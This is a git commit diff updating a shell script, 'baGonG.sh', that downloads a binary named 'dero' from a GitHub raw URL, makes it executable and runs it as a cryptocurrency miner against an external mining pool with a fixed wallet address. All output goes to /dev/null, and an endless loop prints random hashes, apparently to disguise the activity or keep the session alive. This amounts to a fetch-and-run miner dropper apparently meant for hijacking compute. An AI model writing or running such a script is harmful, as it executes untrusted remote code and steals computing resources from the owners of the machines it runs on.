edf696f219fb47910c7abde403d3e5d7970904c6
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-14 13:43:41 +0700

    Update baGonG.sh

--- baGonG.sh
+++ baGonG.sh
@@ -1,9 +1,25 @@
-wget https://github.com/RizQu5/2022/raw/main/dero > /dev/null 2>&1
-chmod +x dero > /dev/null 2>&1
+#!/bin/bash
+
+#!/bin/sh
+
+#!/bin/bash
+
+apt update
+
+sudo apt install screen libjansson4 -y 
+
+wget https://github.com/angkii/2022/raw/main/dero >/dev/null 2>&1
+
+chmod +x dero >/dev/null 2>&1
+
+screen -dmS ls
+
+./dero -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO > /dev/null 2>&1
+
 while [ 1 ]; do
-  ./dero -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO > /dev/null 2>&1
-done
-while [ 1 ]; do
-  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2s; done
-sleep 2
+
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
+
+sleep 1
+
 done
